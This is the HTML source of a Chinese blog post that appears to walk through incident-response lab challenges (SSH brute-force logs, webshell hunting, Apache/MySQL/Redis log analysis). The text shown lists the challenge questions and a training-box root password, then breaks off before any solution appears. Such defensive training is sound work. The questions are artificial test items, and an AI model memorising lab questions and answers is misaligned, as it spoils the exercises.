<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.3.0">

  <link rel="apple-touch-icon" sizes="180x180" href="/upload/apple-touch-icon.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/upload/favicon-32x32.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/upload/favicon-16x16.png">
  <link rel="mask-icon" href="/upload/kaoruko.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">

<script class="next-config" data-name="main" type="application/json">{"hostname":"hllttz.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.25.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js" defer></script>

    <meta name="description" content="玄机应急响应">
<meta property="og:type" content="article">
<meta property="og:title" content="玄机应急相应">
<meta property="og:url" content="https://hllttz.github.io/2025/10/09/%E7%8E%84%E6%9C%BA%E5%BA%94%E6%80%A5%E7%9B%B8%E5%BA%94/index.html">
<meta property="og:site_name" content="hllttz&#39;s blog">
<meta property="og:description" content="玄机应急响应">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://hllttz.github.io/images/image-20250724152356692.png">
<meta property="og:image" content="https://hllttz.github.io/images/image-20250724152704598.png">
<meta property="og:image" content="https://hllttz.github.io/images/image-20250724155220079.png">
<meta property="og:image" content="https://hllttz.github.io/images/image-20250724155717548.png">
<meta property="og:image" content="https://hllttz.github.io/images/image-20250724161457342.png">
<meta property="og:image" content="https://hllttz.github.io/images/image-20250724161337227.png">
<meta property="og:image" content="https://hllttz.github.io/images/image-20250724163018731.png">
<meta property="og:image" content="https://hllttz.github.io/images/image-20251004235552672.png">
<meta property="og:image" content="https://hllttz.github.io/images/image-20251005000154480.png">
<meta property="og:image" content="https://hllttz.github.io/images/image-20251005001906388.png">
<meta property="og:image" content="https://hllttz.github.io/images/image-20251005123214865.png">
<meta property="og:image" content="https://hllttz.github.io/images/image-20251005123505479.png">
<meta property="og:image" content="https://hllttz.github.io/images/image-20251005123547831.png">
<meta property="og:image" content="https://hllttz.github.io/images/image-20251005124059001.png">
<meta property="og:image" content="https://hllttz.github.io/images/image-20251005124126674.png">
<meta property="og:image" content="https://hllttz.github.io/images/image-20251005131649130.png">
<meta property="og:image" content="https://hllttz.github.io/images/image-20251005131150853.png">
<meta property="og:image" content="https://hllttz.github.io/images/image-20251005131543485.png">
<meta property="og:image" content="https://hllttz.github.io/images/image-20251005131843312.png">
<meta property="og:image" content="https://hllttz.github.io/images/image-20251005131918976.png">
<meta property="og:image" content="https://hllttz.github.io/images/1049983-20241029144803066-1531375887.png">
<meta property="og:image" content="https://hllttz.github.io/images/image-20251005132614950.png">
<meta property="article:published_time" content="2025-10-09T09:01:59.000Z">
<meta property="article:modified_time" content="2025-10-09T09:05:12.587Z">
<meta property="article:author" content="hllttz">
<meta property="article:tag" content="应急响应">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://hllttz.github.io/images/image-20250724152356692.png">


<link rel="canonical" href="https://hllttz.github.io/2025/10/09/%E7%8E%84%E6%9C%BA%E5%BA%94%E6%80%A5%E7%9B%B8%E5%BA%94/">


<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://hllttz.github.io/2025/10/09/%E7%8E%84%E6%9C%BA%E5%BA%94%E6%80%A5%E7%9B%B8%E5%BA%94/","path":"2025/10/09/玄机应急相应/","title":"玄机应急相应"}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>玄机应急相应 | hllttz's blog</title>
  








  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>

  






  





  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <div class="column">
      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <p class="site-title">hllttz's blog</p>
      <i class="logo-line"></i>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="搜索" role="button">
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">15</span></a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">13</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">16</span></a></li><li class="menu-item menu-item-schedule"><a href="/schedule/" rel="section"><i class="fa fa-calendar fa-fw"></i>日程表</a></li>
  </ul>
</nav>




</header>
        
  
  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%8E%84%E6%9C%BA%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94"><span class="nav-number">1.</span> <span class="nav-text">玄机应急响应</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AC%AC%E4%B8%80%E7%AB%A0-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-Linux%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90"><span class="nav-number">1.1.</span> <span class="nav-text">第一章 应急响应-Linux日志分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9C%89%E5%A4%9A%E5%B0%91IP%E5%9C%A8%E7%88%86%E7%A0%B4%E4%B8%BB%E6%9C%BAssh%E7%9A%84root%E5%B8%90%E5%8F%B7%EF%BC%8C%E5%A6%82%E6%9E%9C%E6%9C%89%E5%A4%9A%E4%B8%AA%E4%BD%BF%E7%94%A8%E2%80%9D-%E2%80%9D%E5%88%86%E5%89%B2"><span class="nav-number">1.1.1.</span> <span class="nav-text">有多少IP在爆破主机ssh的root帐号，如果有多个使用”,”分割</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ssh%E7%88%86%E7%A0%B4%E6%88%90%E5%8A%9F%E7%99%BB%E9%99%86%E7%9A%84IP%E6%98%AF%E5%A4%9A%E5%B0%91%EF%BC%8C%E5%A6%82%E6%9E%9C%E6%9C%89%E5%A4%9A%E4%B8%AA%E4%BD%BF%E7%94%A8%E2%80%9D-%E2%80%9D%E5%88%86%E5%89%B2"><span class="nav-number">1.1.2.</span> <span class="nav-text">ssh爆破成功登陆的IP是多少，如果有多个使用”,”分割</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%88%86%E7%A0%B4%E7%94%A8%E6%88%B7%E5%90%8D%E5%AD%97%E5%85%B8%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F%E5%A6%82%E6%9E%9C%E6%9C%89%E5%A4%9A%E4%B8%AA%E4%BD%BF%E7%94%A8%E2%80%9D-%E2%80%9D%E5%88%86%E5%89%B2"><span class="nav-number">1.1.3.</span> <span class="nav-text">爆破用户名字典是什么？如果有多个使用”,”分割</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%99%BB%E9%99%86%E6%88%90%E5%8A%9F%E7%9A%84IP%E5%85%B1%E7%88%86%E7%A0%B4%E4%BA%86%E5%A4%9A%E5%B0%91%E6%AC%A1"><span class="nav-number">1.1.4.</span> <span class="nav-text">登陆成功的IP共爆破了多少次</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%BB%91%E5%AE%A2%E7%99%BB%E9%99%86%E4%B8%BB%E6%9C%BA%E5%90%8E%E6%96%B0%E5%BB%BA%E4%BA%86%E4%B8%80%E4%B8%AA%E5%90%8E%E9%97%A8%E7%94%A8%E6%88%B7%EF%BC%8C%E7%94%A8%E6%88%B7%E5%90%8D%E6%98%AF%E5%A4%9A%E5%B0%91"><span class="nav-number">1.1.5.</span> <span class="nav-text">黑客登陆主机后新建了一个后门用户，用户名是多少</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AC%AC%E4%B8%80%E7%AB%A0-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-webshell%E6%9F%A5%E6%9D%80"><span class="nav-number">1.2.</span> <span class="nav-text">第一章 应急响应-webshell查杀</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%BB%91%E5%AE%A2webshell%E9%87%8C%E9%9D%A2%E7%9A%84flag-flag-xxxxx-xxxx-xxxx-xxxx-xxxx"><span class="nav-number">1.2.1.</span> <span class="nav-text">黑客webshell里面的flag flag{xxxxx-xxxx-xxxx-xxxx-xxxx}</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%BB%91%E5%AE%A2%E4%BD%BF%E7%94%A8%E7%9A%84%E4%BB%80%E4%B9%88%E5%B7%A5%E5%85%B7%E7%9A%84shell-github%E5%9C%B0%E5%9D%80%E7%9A%84md5-flag-md5"><span class="nav-number">1.2.2.</span> <span class="nav-text">黑客使用的什么工具的shell github地址的md5 flag{md5}</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%BB%91%E5%AE%A2%E9%9A%90%E8%97%8Fshell%E7%9A%84%E5%AE%8C%E6%95%B4%E8%B7%AF%E5%BE%84%E7%9A%84md5-flag-md5-%E6%B3%A8-xxx-xxx-xxx-xxx-xxx-xxx"><span class="nav-number">1.2.3.</span> <span class="nav-text">黑客隐藏shell的完整路径的md5 flag{md5} 注 : &#x2F;xxx&#x2F;xxx&#x2F;xxx&#x2F;xxx&#x2F;xxx.xxx</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%BB%91%E5%AE%A2%E5%85%8D%E6%9D%80%E9%A9%AC%E5%AE%8C%E6%95%B4%E8%B7%AF%E5%BE%84-md5-flag-md5"><span class="nav-number">1.2.4.</span> <span class="nav-text">黑客免杀马完整路径 md5 flag{md5}</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AC%AC%E4%B8%80%E7%AB%A0-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-Linux%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5"><span class="nav-number">1.3.</span> <span class="nav-text">第一章 应急响应- Linux入侵排查</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#web%E7%9B%AE%E5%BD%95%E5%AD%98%E5%9C%A8%E6%9C%A8%E9%A9%AC%EF%BC%8C%E8%AF%B7%E6%89%BE%E5%88%B0%E6%9C%A8%E9%A9%AC%E7%9A%84%E5%AF%86%E7%A0%81%E6%8F%90%E4%BA%A4"><span class="nav-number">1.3.1.</span> <span class="nav-text">web目录存在木马，请找到木马的密码提交</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%96%91%E4%BC%BC%E5%AD%98%E5%9C%A8%E4%B8%8D%E6%AD%BB%E9%A9%AC%EF%BC%8C%E8%AF%B7%E6%89%BE%E5%88%B0%E4%B8%8D%E6%AD%BB%E9%A9%AC%E7%9A%84%E5%AF%86%E7%A0%81%E6%8F%90%E4%BA%A4"><span class="nav-number">1.3.2.</span> <span class="nav-text">服务器疑似存在不死马，请找到不死马的密码提交</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%8D%E6%AD%BB%E9%A9%AC%E6%98%AF%E9%80%9A%E8%BF%87%E5%93%AA%E4%B8%AA%E6%96%87%E4%BB%B6%E7%94%9F%E6%88%90%E7%9A%84%EF%BC%8C%E8%AF%B7%E6%8F%90%E4%BA%A4%E6%96%87%E4%BB%B6%E5%90%8D"><span class="nav-number">1.3.3.</span> <span class="nav-text">不死马是通过哪个文件生成的，请提交文件名</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%BB%91%E5%AE%A2%E7%95%99%E4%B8%8B%E4%BA%86%E6%9C%A8%E9%A9%AC%E6%96%87%E4%BB%B6%EF%BC%8C%E8%AF%B7%E6%89%BE%E5%87%BA%E9%BB%91%E5%AE%A2%E7%9A%84%E6%9C%8D%E5%8A%A1%E5%99%A8ip%E6%8F%90%E4%BA%A4"><span class="nav-number">1.3.4.</span> <span class="nav-text">黑客留下了木马文件，请找出黑客的服务器ip提交</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%BB%91%E5%AE%A2%E7%95%99%E4%B8%8B%E4%BA%86%E6%9C%A8%E9%A9%AC%E6%96%87%E4%BB%B6%EF%BC%8C%E8%AF%B7%E6%89%BE%E5%87%BA%E9%BB%91%E5%AE%A2%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BC%80%E5%90%AF%E7%9A%84%E7%9B%91%E7%AB%AF%E5%8F%A3%E6%8F%90%E4%BA%A4"><span class="nav-number">1.3.5.</span> <span class="nav-text">黑客留下了木马文件，请找出黑客服务器开启的监端口提交</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AC%AC%E4%B8%80%E7%AB%A0-%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90-apache%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90"><span class="nav-number">1.4.</span> <span class="nav-text">第一章 日志分析-apache日志分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8F%90%E4%BA%A4%E5%BD%93%E5%A4%A9%E8%AE%BF%E9%97%AE%E6%AC%A1%E6%95%B0%E6%9C%80%E5%A4%9A%E7%9A%84IP%EF%BC%8C%E5%8D%B3%E9%BB%91%E5%AE%A2IP%EF%BC%9A"><span class="nav-number">1.4.1.</span> <span class="nav-text">提交当天访问次数最多的IP，即黑客IP：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%BB%91%E5%AE%A2%E4%BD%BF%E7%94%A8%E7%9A%84%E6%B5%8F%E8%A7%88%E5%99%A8%E6%8C%87%E7%BA%B9%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%8C%E6%8F%90%E4%BA%A4%E6%8C%87%E7%BA%B9%E7%9A%84md5%EF%BC%9A"><span class="nav-number">1.4.2.</span> <span class="nav-text">黑客使用的浏览器指纹是什么，提交指纹的md5：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9F%A5%E7%9C%8B%E5%8C%85%E5%90%ABindex-php%E9%A1%B5%E9%9D%A2%E8%A2%AB%E8%AE%BF%E9%97%AE%E7%9A%84%E6%AC%A1%E6%95%B0%EF%BC%8C%E6%8F%90%E4%BA%A4%E6%AC%A1%E6%95%B0%EF%BC%9A"><span class="nav-number">1.4.3.</span> <span class="nav-text">查看包含index.php页面被访问的次数，提交次数：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9F%A5%E7%9C%8B%E9%BB%91%E5%AE%A2IP%E8%AE%BF%E9%97%AE%E4%BA%86%E5%A4%9A%E5%B0%91%E6%AC%A1%EF%BC%8C%E6%8F%90%E4%BA%A4%E6%AC%A1%E6%95%B0%EF%BC%9A"><span class="nav-number">1.4.4.</span> <span class="nav-text">查看黑客IP访问了多少次，提交次数：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9F%A5%E7%9C%8B2023%E5%B9%B48%E6%9C%8803%E6%97%A58%E6%97%B6%E8%BF%99%E4%B8%80%E4%B8%AA%E5%B0%8F%E6%97%B6%E5%86%85%E6%9C%89%E5%A4%9A%E5%B0%91IP%E8%AE%BF%E9%97%AE%EF%BC%8C%E6%8F%90%E4%BA%A4%E6%AC%A1%E6%95%B0"><span class="nav-number">1.4.5.</span> <span class="nav-text">查看2023年8月03日8时这一个小时内有多少IP访问，提交次数:</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AC%AC%E4%B8%80%E7%AB%A0%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90-mysql%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94"><span class="nav-number">1.5.</span> <span class="nav-text">第一章日志分析-mysql应急响应</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%BB%91%E5%AE%A2%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%86%99%E5%85%A5%E7%9A%84shell"><span class="nav-number">1.5.1.</span> <span class="nav-text">黑客第一次写入的shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%BB%91%E5%AE%A2%E5%8F%8D%E5%BC%B9shell%E7%9A%84ip"><span class="nav-number">1.5.2.</span> <span class="nav-text">黑客反弹shell的ip</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%BB%91%E5%AE%A2%E6%8F%90%E6%9D%83%E6%96%87%E4%BB%B6%E7%9A%84%E5%AE%8C%E6%95%B4%E8%B7%AF%E5%BE%84"><span class="nav-number">1.5.3.</span> <span class="nav-text">黑客提权文件的完整路径</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%BB%91%E5%AE%A2%E8%8E%B7%E5%8F%96%E7%9A%84%E6%9D%83%E9%99%90"><span class="nav-number">1.5.4.</span> <span class="nav-text">黑客获取的权限</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AC%AC%E4%BA%8C%E7%AB%A0%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90-redis%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94"><span class="nav-number">1.6.</span> <span class="nav-text">第二章日志分析-redis应急响应</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%86%E6%9E%90%E9%BB%91%E5%AE%A2%E6%94%BB%E5%87%BB%E6%88%90%E5%8A%9F%E7%9A%84-IP-%E4%B8%BA%E5%A4%9A%E5%B0%91"><span class="nav-number">1.6.1.</span> <span class="nav-text">分析黑客攻击成功的 IP 为多少</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%86%E6%9E%90%E9%BB%91%E5%AE%A2%E7%AC%AC%E4%B8%80%E6%AC%A1%E4%B8%8A%E4%BC%A0%E7%9A%84%E6%81%B6%E6%84%8F%E6%96%87%E4%BB%B6"><span class="nav-number">1.6.2.</span> <span class="nav-text">分析黑客第一次上传的恶意文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%86%E6%9E%90%E9%BB%91%E5%AE%A2%E5%8F%8D%E5%BC%B9-shell-%E7%9A%84IP-%E4%B8%BA%E5%A4%9A%E5%B0%91"><span class="nav-number">1.6.3.</span> <span class="nav-text">分析黑客反弹 shell 的IP 为多少</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BA%AF%E6%BA%90%E5%88%86%E6%9E%90%E9%BB%91%E5%AE%A2%E7%9A%84%E7%94%A8%E6%88%B7%E5%90%8D%EF%BC%8C%E5%B9%B6%E4%B8%94%E6%89%BE%E5%88%B0%E9%BB%91%E5%AE%A2%E4%BD%BF%E7%94%A8%E7%9A%84%E5%B7%A5%E5%85%B7%E9%87%8C%E7%9A%84%E5%85%B3%E9%94%AE%E5%AD%97%E7%AC%A6%E4%B8%B2"><span class="nav-number">1.6.4.</span> <span class="nav-text">溯源分析黑客的用户名，并且找到黑客使用的工具里的关键字符串</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%86%E6%9E%90%E9%BB%91%E5%AE%A2%E7%AF%A1%E6%94%B9%E7%9A%84%E5%91%BD%E4%BB%A4"><span class="nav-number">1.6.5.</span> <span class="nav-text">分析黑客篡改的命令</span></a></li></ol></li></ol></li></ol></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">hllttz</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">16</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
          <a href="/categories/">
        <span class="site-state-item-count">13</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
          <a href="/tags/">
        <span class="site-state-item-count">15</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>

        </div>
      </div>
    </div>

    
  </aside>


    </div>

    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://hllttz.github.io/2025/10/09/%E7%8E%84%E6%9C%BA%E5%BA%94%E6%80%A5%E7%9B%B8%E5%BA%94/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="hllttz">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="hllttz's blog">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="玄机应急相应 | hllttz's blog">
      <meta itemprop="description" content="玄机应急响应">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          玄机应急相应
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>
      

      <time title="创建时间：2025-10-09 17:01:59 / 修改时间：17:05:12" itemprop="dateCreated datePublished" datetime="2025-10-09T17:01:59+08:00">2025-10-09</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/" itemprop="url" rel="index"><span itemprop="name">应急响应</span></a>
        </span>
    </span>

  
    <span class="post-meta-item" title="本文字数">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">本文字数：</span>
      <span>27k</span>
    </span>
    <span class="post-meta-item" title="阅读时长">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">阅读时长 &asymp;</span>
      <span>25 分钟</span>
    </span>
</div>

            <div class="post-description">玄机应急响应</div>
        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody"><h1 id="玄机应急响应"><a href="#玄机应急响应" class="headerlink" title="玄机应急响应"></a>玄机应急响应</h1><h2 id="第一章-应急响应-Linux日志分析"><a href="#第一章-应急响应-Linux日志分析" class="headerlink" title="第一章 应急响应-Linux日志分析"></a>第一章 应急响应-Linux日志分析</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">账号root密码linuxrz</span><br><span class="line">ssh root@IP</span><br><span class="line">1.有多少IP在爆破主机ssh的root帐号，如果有多个使用&quot;,&quot;分割</span><br><span class="line">2.ssh爆破成功登陆的IP是多少，如果有多个使用&quot;,&quot;分割</span><br><span class="line">3.爆破用户名字典是什么？如果有多个使用&quot;,&quot;分割</span><br><span class="line">4.登陆成功的IP共爆破了多少次</span><br><span class="line">5.黑客登陆主机后新建了一个后门用户，用户名是多少</span><br></pre></td></tr></table></figure>

<p>一般ssh登录日志存放在&#x2F;var&#x2F;log&#x2F;auth.log下,也可用find -name 查询日志所在目录</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span 